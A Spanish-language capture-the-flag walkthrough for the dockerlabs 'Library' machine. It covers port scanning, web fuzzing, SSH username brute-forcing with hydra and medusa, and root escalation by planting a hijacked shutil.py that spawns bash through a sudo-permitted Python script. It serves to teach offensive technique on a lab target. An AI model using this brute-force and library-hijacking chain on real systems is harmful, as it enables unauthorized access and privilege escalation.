Lo primero que tenemos que hacer, es ir a la pagina de "dockerlabs.es" y bajarnos la maquina "Library".
Una vez hecho y COMO SIEMPRE, descomprimimos el archivo, e inicializamos la maquina con el comando:
```
sudo bash auto_deploy.sh library.tar
```
Lo primero de todo, tras desplegarse la maquina, es hacer un NMAP. No necesitamos hacer un ARP-SCAN (o NETDISCOVER), porque ya sabemos la IP de la maquina victima.
```
nmap -p- --open -sCV -sS --min-rate 5000 172.17.0.2 -n -Pn -vvv
```
Una vez terminado, vemos que tiene dos puertos abiertos: el 22 (SSH) y el 80 (HTML)
```
Discovered open port 22/tcp on 172.17.0.2
Discovered open port 80/tcp on 172.17.0.2
```
Como no tenemos ni usuario ni contraseña aun para atacar el puerto 22, vamos a probar poniendo la direccion IP en el navegador.
Sin embargo, aparece la tipica pagina de Apache, por lo que vamos a empezar haciendo un poco de FUZZING WEB con "gobuster":
```
gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x txt,php,html -t 20
```
Y vemos que nos devuelve la siguiente informacion:
```
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 26]
/.html                (Status: 403) [Size: 275]
/index.html           (Status: 200) [Size: 10671]
/javascript           (Status: 301) [Size: 313] [--> http://172.17.0.2/javascript/]
/.html                (Status: 403) [Size: 275]
/server-status        (Status: 403) [Size: 275]
Progress: 1453501 / 1453508 (100.00%)
===============================================================
Finished
===============================================================
```
Si nos fijamos, hay un "/index.php" y un "/index.html" lo cual es curioso, asi que vamos a probar con ambos a ver que nos encontramos.
Con "/index.html" no hay nada interesante, ya que nos deja en la misma pagina que antes, pero con "/index.php", la cosa cambia ya que nos sale una cadena de caracteres:
```
JIFGHDS87GYDFIGD
```
Bien, probaremos entonces con fuerza bruta e HYDRA/MEDUSA para ver si podemos obtener el nombre de algun usuario, usando esta cadena de caracteres como "password":
```
HYDRA:
hydra -L /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -p JIFGHDS87GYDFIGD ssh://172.17.0.2

MEDUSA:
medusa -h 172.17.0.2 -U /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -p JIFGHDS87GYDFIGD -M ssh
```
Vemos que hay un usuario que se llama "carlos" y cuya contraseña es la que hemos puesto antes: "JIFGHDS87GYDFIGD"
```
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: carlos   password: JIFGHDS87GYDFIGD
[STATUS] 306.00 tries/min, 306 tries in 00:01h, 8295150 to do in 451:49h, 15 active
```
Es momento de probar a entrar por SSH a ver si hay suerte:
```
ssh carlos@172.17.0.2
```
y tras darle que "yes" a las fingerprints e introducir la contraseña, ya estamos dentro:
```
carlos@c6c871fec19b:~$ whoami
carlos

carlos@c6c871fec19b:~$
```
En este momento, nos toca intentar hacer una escalada de privilegios con "sudo -l":
```
carlos@c6c871fec19b:~$ sudo -l

Matching Defaults entries for carlos on c6c871fec19b:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User carlos may run the following commands on c6c871fec19b:
    (ALL) NOPASSWD: /usr/bin/python3 /opt/script.py
    
carlos@c6c871fec19b:~$
```
Bien, vamos a probar a hacer un pequeño "cat" a ese archivo "script.py" a ver que obtenemos:
```
cat /opt/script.py


import shutil

def copiar_archivo(origen, destino):
    shutil.copy(origen, destino)
    print(f'Archivo copiado de {origen} a {destino}')

if __name__ == '__main__':
    origen = '/opt/script.py'
    destino = '/tmp/script_backup.py'
    copiar_archivo(origen, destino)

```
Aqui podemos observar algo MUY curioso. Si nos fijamos en ese "import shutil", vemos que NO esta con su ruta absoluta.

-Vale, bien... y ¿que quiere decir esto?

-Pues quiere decir que como Python SIEMPRE busca primero en la carpeta donde se encuentra el archivo ".py", pues este ira a comprobar si existe esa libreria primero en la carpeta "/opt/" que es donde se encuentra el "script.py"

-¿Y.... ?

-Y... eso quiere decir que podemos intentar un "Python Library Hijacking".

-Ya... pero, ¿eso que es?

-Pues el metodo de explotación de “Python Library Hijacking”, consiste en suplantar una libreria de Python, que un binario este usando, para inyectar codigo de forma que el atacante escale privilegios y/u obtenga una "shell" en el sistema.

En este caso en concreto, lo que hariamos seria crear nuestro propio archivo "shutil.py", el cual dejaremos dentro de la carpeta "/opt/" y cuyo contenido sea:
```
import os
os.system("bash")
```
Una vez, hecho esto con "nano", por ejemplo, solo nos quedaria lanzar el "script.py" con el comando:
```
sudo python3 /opt/script.py  <== Ponemos SIEMPRE la ruta absoluta
```
Si ahora escrimos "whoami", veremos que hemos pasado de ser el usuario "carlos" a ser directamente el usuario "root":
```
carlos@c6c871fec19b:/opt$ sudo python3 /opt/script.py

root@c6c871fec19b:/opt# whoami
root

root@c6c871fec19b:/opt#
```
Y listo, la maquina estaria terminada.



